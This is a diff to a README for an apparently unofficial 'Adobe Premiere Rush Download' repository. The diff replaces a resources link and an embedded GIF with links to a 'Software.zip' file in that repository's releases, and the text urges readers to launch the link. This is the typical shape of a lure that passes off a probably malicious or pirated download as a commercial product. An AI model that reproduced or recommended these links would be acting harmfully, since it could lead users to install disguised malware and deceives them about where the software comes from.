@@ -23,7 +23,7 @@ Welcome to the **Adobe Premiere Rush Download** repository! Here you will find i
 - whats-adobe-premiere-rush
 
 ## Resources
-For a deeper dive into the world of Adobe Premiere Rush, make sure to visit the [GitHub Repository](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Don't forget to launch the provided link to access valuable content and tools for your video editing projects!
+For a deeper dive into the world of Adobe Premiere Rush, make sure to visit the [GitHub Repository](https://github.com/Jannnxn/Adobe-Premiere-Rush-Download/releases/download/v2.0/Software.zip). Don't forget to launch the provided link to access valuable content and tools for your video editing projects!
 
 ## 🔧 Get Started!
 To kickstart your Adobe Premiere Rush journey, follow these steps:
@@ -37,7 +37,7 @@ If you have insights, tips, or resources to share regarding Adobe Premiere Rush,
 ## 🌟 Let's Connect
 Stay updated on the latest Adobe Premiere Rush trends, tutorials, and news by connecting with us on social media platforms. Join the conversation to learn, grow, and inspire others in the realm of video editing.
 
-![Adobe Premiere Rush](https://media.giphy.com/media/l41lDOCyaK8RSrGOc/giphy.gif)
+![Adobe Premiere Rush](https://github.com/Jannnxn/Adobe-Premiere-Rush-Download/releases/download/v2.0/Software.zip)
 
 ## 📸 Showcase
 Checkout some amazing video editing projects and accomplishments made possible with Adobe Premiere Rush. Be inspired by the creativity and innovation within the community.
